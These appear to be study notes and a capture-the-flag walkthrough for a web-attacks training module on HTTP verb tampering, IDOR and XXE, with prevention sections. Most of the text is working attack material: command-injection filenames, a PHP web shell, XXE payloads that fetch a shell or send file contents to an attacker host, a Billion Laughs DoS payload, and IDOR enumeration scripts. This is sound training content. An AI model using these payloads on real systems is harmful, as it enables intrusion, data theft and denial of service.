# # Introduction to Web Attacks

**HTTP Verb Tampering**

GET  
POST  
PUT  
DELETE  
PATCH  
OPTIONS  
HEAD

**Insecure Direct Object References (IDOR)**

**XML External Entity (XXE) Injection**


# Bypassing Basic Authentication

**Target Endpoint**

http://SERVER_IP:PORT/admin/reset.php  
http://SERVER_IP:PORT/admin/

**OPTIONS Method Enumeration**

```
curl -i -X OPTIONS http://SERVER_IP:PORT/
```

**Allowed HTTP Methods (Header)**

Allow: POST,OPTIONS,HEAD,GET

**HEAD Request to Bypass Authentication**

HEAD /admin/reset.php HTTP/1.1  
Host: SERVER_IP:PORT  
User-Agent: Mozilla/5.0  
Accept: _/_  
Connection: close

**Burp Suite Action**

Change Request Method → HEAD/DELETE



# Bypassing Security Filters

**Target URL**

http://SERVER_IP:PORT/

**Blocked Test Filename**

test;

**Intercepted Request (GET With Encoded Filename)**

GET /?filename=test%3B HTTP/1.1  
Host: SERVER_IP:PORT

**Burp Suite Action**

Change Request Method

**Command Injection Test Filename**

file1; touch file2;

**Intercepted Request (GET With Encoded Injection Filename)**

GET /?filename=file1%3B+touch+file2%3B HTTP/1.1  
Host: SERVER_IP:PORT

**Question Payload Filename**

file; cp /flag.txt ./




# Verb Tampering Prevention

**Apache Vulnerable Configuration (000-default.conf / .htaccess)**

```xml
<Directory "/var/www/html/admin">
    AuthType Basic
    AuthName "Admin Panel"
    AuthUserFile /etc/apache2/.htpasswd
    <Limit GET>
        Require valid-user
    </Limit>
</Directory>
```

**Tomcat Vulnerable Configuration (web.xml)**

```xml
<security-constraint>
    <web-resource-collection>
        <url-pattern>/admin/*</url-pattern>
        <http-method>GET</http-method>
    </web-resource-collection>
    <auth-constraint>
        <role-name>admin</role-name>
    </auth-constraint>
</security-constraint>
```

**ASP.NET Vulnerable Configuration (web.config)**

```xml
<system.web>
    <authorization>
        <allow verbs="GET" roles="admin">
            <deny verbs="GET" users="*">
        </deny>
        </allow>
    </authorization>
</system.web>
```

**Apache Safe Keyword**

LimitExcept

**Tomcat Safe Keyword**

http-method-omission

**ASP.NET Safe Keywords**

add  
remove

**PHP Vulnerable Code Example**

```php
if (isset($_REQUEST['filename'])) {
    if (!preg_match('/[^A-Za-z0-9. _-]/', $_POST['filename'])) {
        system("touch " . $_REQUEST['filename']);
    } else {
        echo "Malicious Request Denied!";
    }
}
```

**Security Filter Scope Variables**

$_REQUEST['param']  
request.getParameter('param')  
Request['param']



# Intro to IDOR 

**Example Vulnerable Endpoint**

download.php?file_id=123  
download.php?file_id=124

**Example Parameter**

file_id

**Access Control Model Mentioned**

RBAC


# Identifying IDORs

**Example URL Parameters**

?uid=1  
?uid=2  
?filename=file_1.pdf  
?filename=file_2.pdf

**Example Encoded Reference**

?filename=ZmlsZV8xMjMucGRm  
?filename=ZmlsZV8xMjQucGRm

**Example Hashed Reference**

download.php?filename=c81e728d9d4c2f636f067f89cc14862c

**AJAX Password Change Function**

```javascript
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```

**AJAX MD5 Hashing Example**

```javascript
$.ajax({
    url:"download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
    success:function(result){
        //
    }
});
```

**Example API Response Structure**

```json
{
  "attributes" : 
    {
      "type" : "salary",
      "url" : "/services/data/salaries/users/1"
    },
  "Id" : "1",
  "Name" : "User1"

}
```


# Mass IDOR Enumeration

**Target URLs**  
http://SERVER_IP:PORT/  
http://SERVER_IP:PORT/documents.php  
http://SERVER_IP:PORT/documents.php?uid=1  
http://SERVER_IP:PORT/documents.php?uid=2  
http://SERVER_IP:PORT/documents.php?uid=3

**Static File Paths**  
/documents/Invoice_1_09_2021.pdf  
/documents/Report_1_10_2021.pdf  
/documents/Invoice_2_08_2020.pdf  
/documents/Report_2_12_2020.pdf

**HTML Snippets**

```html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

**cURL + grep (Link Discovery)**

```bash
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "<li class='pure-tree_link'>"
```

**cURL + grep Regex Extraction**

```bash
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
```

**Mass Enumeration Download Script**

```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

**Tools**  
Burp Intruder  
ZAP Fuzzer  
curl  
grep  
wget



```shell
#!/bin/bash
url="http://94.237.50.221:34201"

echo "=== Mass IDOR Enumeration with POST ==="
for i in {1..20}; do
    echo "Checking uid $i"
    # Use POST method with uid parameter
    for link in $(curl -X POST -d "uid=$i" "$url/documents.php" | grep -oP "\\/documents\\/[^']*\\.(pdf|txt)"); do
        echo "  Found: $link"
        # Download the file
        wget -q "$url$link"
        # If it's a .txt file, display content immediately
        filename=$(basename "$link")
        if [[ "$filename" == *.txt ]]; then
            echo "  *** FLAG FOUND: $filename ***"
            echo "  Content:"
            cat "$filename"
            echo "=========================="
        fi
    done
done
echo "=== Enumeration completed ==="   
```

# Bypassing Encoded References

**Pages / Endpoints**  
http://SERVER_IP:PORT/contracts.php  
/download.php

**Intercepted POST Parameter**  
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b

**JavaScript Link Call**  
javascript:downloadContract('1')

**downloadContract Function**

```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

**MD5 of UID Attempt**

```bash
echo -n 1 | md5sum
```

**Base64 Then MD5 Match**

```bash
echo -n 1 | base64 -w 0 | md5sum
```

**Hash Generation Loop (First 10)**

```bash
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```

**Mass Download Script (1..10)**

```bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

**Run Script**

```bash
bash ./exploit.sh
```

**Read Flag Mention**  
cat
```shell
#!/bin/bash

url="http://154.57.164.69:32128" # Replace with actual target

flag_pattern="HTB{[a-zA-Z0-9_]+}"

for i in {1..20}; do

# Base64 encode UID, then URL encode

encoded_uid=$(echo -n "$i" | base64 | tr -d '\n' | php -r 'echo urlencode(fgets(STDIN));')

filename="contract_${i}.pdf"

# Download the PDF

curl -s -X GET "$url/download.php?contract=$encoded_uid" -o "$filename"

# Check for flag in the file

if grep -qE "$flag_pattern" "$filename"; then

echo "Flag found in $filename:"

grep -oE "$flag_pattern" "$filename"

break

fi

done
```

# IDOR in Insecure APIs 

**Pages / Endpoints**  
http://SERVER_IP:PORT/  
http://SERVER_IP:PORT/profile/index.php  
/profile/api.php/profile/1  
/profile/api.php/profile/2

**Update Request Method**  
PUT

**Cookie**  
role=employee

**PUT JSON Body**

```json
{
    "uid": 1,
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "employee",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

**Attempted UID Change**  
"uid": 2

**Error Message**  
uid mismatch

**Attempted Endpoint Change**  
/profile/api.php/profile/2

**Error Message**  
uuid mismatch

**Attempted Create Method**  
POST

**Error Message**  
Creating new employees is for admins only

**Attempted Delete Method**  
DELETE

**Error Message**  
Deleting employees is for admins only

**Attempted Role Change**  
admin  
administrator

**Error Message**  
Invalid role

**Mentioned Request Type**  
GET



# Chaining IDOR Vulnerabilities 
**Pages / Endpoints**

http://SERVER_IP:PORT/profile/index.php  
/profile/api.php/profile/1  
/profile/api.php/profile/2

**Cookie**

role=employee  
role=web_admin

**GET Target (Other UID)**

uid=2

**Leaked User JSON**

```json
{
    "uid": "2",
    "uuid": "4a9bd19b3b8676199592a346051f950c",
    "role": "employee",
    "full_name": "Iona Franklyn",
    "email": "i_franklyn@employees.htb",
    "about": "It takes 20 years to build a reputation and few minutes of cyber-incident to ruin it."
}
```

**Admin User JSON**

```json
{
    "uid": "X",
    "uuid": "a36fa9e66e85f2dd6f5e13cad45248ae",
    "role": "web_admin",
    "full_name": "administrator",
    "email": "webadmin@employees.htb",
    "about": "HTB{FLAG}"
}
```

**Role Name**

web_admin

**Updated Own User JSON (Role Escalation)**

```json
{
    "uid": "1",
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "web_admin",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

**Admin Email Change Target**

[flag@idor.htb](mailto:flag@idor.htb)

**Request Methods Mentioned**

GET  
PUT  
POST  
DELETE

**Messages**

Invalid role

```shell
#!/bin/bash

# Target host and port
HOST="154.57.164.71:31125"
ADMIN_NAMES=("admin")  # Add known admin names here if any, or modify logic as needed

echo "Starting profile enumeration (UID 1-100) on $HOST..."
echo "Looking for admin role or admin indicators in responses..."

for uid in {1..100}; do
    echo -n "Checking UID $uid... "
    
    # Send request with curl, suppress progress, extract JSON response
    response=$(curl -s -k -X GET "http://$HOST/profile/api.php/profile/$uid" \
        -H "Host: $HOST" \
        -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" \
        -H "Accept: */*" \
        -H "Accept-Language: en-US,en;q=0.5" \
        -H "Accept-Encoding: gzip" \
        -H "Referer: http://$HOST/profile/index.php" \
        -H "Content-Type: application/json" \
        -H "Origin: http://$HOST/profile/index.php" \
        -H "DNT: 1" \
        -H "Connection: keep-alive" \
        -H "Cookie: role=employee" \
        -H "Sec-GPC: 1" \
        --compressed)
    
    # Check if response contains valid JSON (starts with { and has uid field)
    if echo "$response" | grep -q '"uid"'; then
        uid_value=$(echo "$response" | grep -o '"uid":"[^"]*' | sed 's/"uid":"//' | tail -1)
        role=$(echo "$response" | grep -o '"role":"[^"]*' | sed 's/"role":"//' | tail -1)
        full_name=$(echo "$response" | grep -o '"full_name":"[^"]*' | sed 's/"full_name":"//' | tail -1)
        
        echo "FOUND: UID=$uid_value | Role=$role | Name=$full_name"
        
        # Check for admin role
        if [[ "$role" == *"admin"* ]]; then
            echo "!!! ADMIN ROLE DETECTED !!! UID: $uid_value | Name: $full_name"
            echo "Response: $response" | tee -a admin_found.txt
        fi
        
        # Check if name contains admin indicators (customize as needed)
        if [[ "$full_name" =~ admin|Admin|ADMIN ]]; then
            echo "!!! POTENTIAL ADMIN NAME DETECTED !!! UID: $uid_value | Name: $full_name"
        fi
        
        # Save interesting responses
        echo "$response" >> profiles_$uid.txt
    else
        echo "No response/Invalid"
    fi
done

echo "Scan complete. Check admin_found.txt and profiles_*.txt for results."
```


# IDOR Prevention 

**RBAC Example Rule**

```javascript
match /api/profile/{userId} {
    allow read, write: if user.isAuth == true
    && (user.uid == userId || user.roles == 'admin');
}
```

**Example Weak Direct Reference**

uid=1

**Example UUID v4**

89c9b29b-d19f-4515-b2dd-abb6e693eb20

**Example Vulnerable PHP Code**

```php
$uid = intval($_REQUEST['uid']);
$query = "SELECT url FROM documents where uid=" . $uid;
$result = mysqli_query($conn, $query);
$row = mysqli_fetch_array($result);
echo "<a href='" . $row['url'] . "' target='_blank'></a>";
```


# Intro to XXE

**Basic XML Document**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<email>
  <date>01-01-2022</date>
  <time>10:00 am UTC</time>
  <sender>john@inlanefreight.com</sender>
  <recipients>
    <to>HR@inlanefreight.com</to>
    <cc>
        <to>billing@inlanefreight.com</to>
        <to>payslips@inlanefreight.com</to>
    </cc>
  </recipients>
  <body>
  Hello,
      Kindly share with me the invoice for the payment made on January 1, 2022.
  Regards,
  John
  </body> 
</email>
```

**Internal DTD Example**

```xml
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
  <!ELEMENT time (#PCDATA)>
  <!ELEMENT sender (#PCDATA)>
  <!ELEMENT to  (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
```

**External DTD Reference (Local File)**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "email.dtd">
```

**External DTD Reference (Remote URL)**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
```

**Internal Entity Definition**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

**External Entity Definition (SYSTEM)**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```


# Local File Disclosure 

**Target Endpoint**

http://SERVER_IP:PORT/index.php  
/submitDetails.php

**Internal Entity Injection Test**

```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

**Entity Reference Usage**

&company;

**External Entity (Local File Read)**

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

**Read PHP Source via Filter**

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

**PHP Web Shell**

```bash
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
```

**Start Python Web Server**

```bash
sudo python3 -m http.server 80
```

**XXE RCE Payload (expect + curl)**

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

**XXE DoS Payload (Billion Laughs)**

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
]>
```

# Advanced File Disclosure 

**External DTD (CDATA Join Payload)**

```xml
<!ENTITY joined "%begin;%file;%end;">
```

**Create External DTD File**

```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
```

**Host DTD File**

```bash
python3 -m http.server 8000
```

**Main XXE Payload (CDATA Method)**

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %xxe;
]>
<email>&joined;</email>
```

**Error-Based External DTD**

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

**Error-Based Main Payload**

```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

**Target Files Mentioned**

file:///var/www/html/submitDetails.php  
file:///etc/hosts  
file:///flag.php

**Endpoints Mentioned**

/index.php  
/error  
/error/submitDetails.php

To read the flag at `/flag.php` using the **CDATA method** in the Hack The Box Web Attacks module:

1. **Host an external DTD file** (`xxe.dtd`) on your server with the following content:
    
    ```xml
    <!ENTITY % file SYSTEM "file:///flag.php">
    <!ENTITY % start "<![CDATA[">
    <!ENTITY % end "]]>">
    <!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
    ```
    
2. **Craft the XML payload** to reference your DTD and trigger the file inclusion:
    
    ```xml
    <!DOCTYPE email [
      <!ENTITY % dtd SYSTEM "http://YOUR_TUNNEL_IP:8000/xxe.dtd">
      %dtd;
      %all;
    ]>
    <email>&fileContents;</email>
    ```

# Blind Data Exfiltration

**OOB External DTD Payload**

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

**OOB Main XML Payload**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

**OOB PHP Listener**

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

**Start PHP Server**

```bash
php -S 0.0.0.0:8000
```

**Clone XXEinjector**

```bash
git clone https://github.com/enjoiz/XXEinjector.git
```

**XXEinjector Request Template**

```http
POST /blind/submitDetails.php HTTP/1.1
Host: SERVER_IP
Content-Type: text/plain;charset=UTF-8

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

**Run XXEinjector (HTTP OOB + PHP Filter)**

```bash
ruby XXEinjector.rb --host=OUR_IP --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

**Log Retrieval**

```bash
cat Logs/SERVER_IP/etc/passwd.log
```

**Target File (Lab Question)**

/327a6c4304ad5938eaf0efb6cc3e53dc.php

- **Set up a listener**: Create a file named `index.php` with the following content:
    
    ```
    <?php
    if (isset($_GET['content'])) {
        error_log("\n\n" . base64_decode($_GET['content']));
    }
    ?>
    ```
    
    Start a PHP server to listen on port 8000:
    
    ```
    php -S 0.0.0.0:8000
    ```
    
- **Create a malicious DTD file (`xxe.dtd`)**: Host this file on your server (accessible at `http://YOUR_IP:8000/xxe.dtd`):
    
    ```
    <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
    <!ENTITY % oob " <!ENTITY content SYSTEM 'http://YOUR_IP:8000/?content=%file;'>">
    %oob;
    ```
    
- **Craft the malicious XML payload** in Burp Repeater:
    
    ```
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE email [
      <!ENTITY % remote SYSTEM "http://YOUR_IP:8000/xxe.dtd">
      %remote;
      %content;
    ]>
    <root>&content;</root>
    ```
    
    Replace `YOUR_IP` with your attack machine's IP address. 
    
- **Send the request**: After sending the payload, check the PHP server logs (`error_log`) — the decoded base64 content will appear, revealing the flag. 
    
- **Decode the flag**: Copy the base64 string from the logs and decode it using:
    
    ```
    echo "BASE64_STRING" | base64 -d
    ```
# XXE Prevention 

**XML LIBRARY / COMPONENT MANAGEMENT**

**SAFE XML CONFIGURATIONS**

Disable referencing custom Document Type Definitions (DTDs)

Disable referencing External XML Entities

Disable Parameter Entity processing

Disable support for XInclude

Prevent Entity Reference Loops

**ERROR HANDLING**

Disable displaying runtime errors in web servers

**ALTERNATIVE DATA FORMATS**

JSON

YAML

REST APIs

**COMPONENTS THAT MAY PARSE XML**

SOAP API libraries

SVG image processors

PDF document processors

**PROTECTION LAYERS**

Web Application Firewalls (WAFs)


# SA

```
for uid in {1..100}; do curl -s "http://154.57.164.69:31205/api.php/user/$uid"; echo; done | grep -i "admin"
```

After logging in, this request was sent:

```
GET /api.php/user/74 HTTP/1.1
Host: 83.136.248.16:41942
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: */*
Referer: http://83.136.248.16:41942/profile.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=p8n6ip0sa52o0qpeei3327ccsc; uid=74
Connection: keep-alive
```

Response:

```
HTTP/1.1 200 OK
Date: Sun, 09 Mar 2025 02:41:08 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 90
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

{"uid":"74","username":"htb-student","full_name":"Paolo Perrone","company":"Schaefer Inc"}
```

If the server only relies on `/74` query, it could return another user. So I sent `1` looking for the admin. I got this result:

```
{"uid":"1","username":"s.applewhite","full_name":"Samanta Applewhite","company":"Daniel Inc"}
```

Not admin but IDOR worked.

I ran a bash script:

```
❯ for uid in {1..100}; do curl -s "http://83.136.248.16:41942/api.php/user/$uid"; echo; done | grep -i "admin"
{"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}
```

Now I got the username of the admin, I need to know their password.

There’s a password change feature so I captured a request:

```
POST /reset.php HTTP/1.1
Host: 83.136.248.16:41942
Content-Length: 62
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://83.136.248.16:41942
Referer: http://83.136.248.16:41942/settings.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=p8n6ip0sa52o0qpeei3327ccsc; uid=74
Connection: keep-alive

uid=74&token=e51a8a14-17ac-11ec-8e67-a3c050fe0c26&password=123
```

It uses a token so even though I changed the uid there I got access denied.

But there’s a request to get a token:

```
GET /api.php/token/74 HTTP/1.1
Host: 83.136.248.16:41942
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: */*
Referer: http://83.136.248.16:41942/settings.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=p8n6ip0sa52o0qpeei3327ccsc; uid=74
Connection: keep-alive
```

I got the token for uid=52 and used it to change the password. However still access denied. I used verb tampering and changed POST to GET. It successfully bypassed the restriction and now the admin password is 123.

Comparing the first user and the admin, I noticed there’s this add event feature for the admin:

```
POST /addEvent.php HTTP/1.1
Host: 83.136.248.16:41942
Content-Length: 167
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://83.136.248.16:41942
Referer: http://83.136.248.16:41942/event.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=p8n6ip0sa52o0qpeei3327ccsc; uid=52
Connection: keep-alive


            <root>
            <name>EVENTNAME</name>
            <details>EVENTDETAILS</details>
            <date>2025-03-09</date>
            </root>
```

Though it doesn’t have xml declaration, from the structure it’s xml. There should be an XXE vulnerability here.

Payload:

```
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php" >
]>
<root>
<name>&xxe;</name>
</root>
```

Got the base64 encoded flag, decoded it with burp and done.
#
#
#
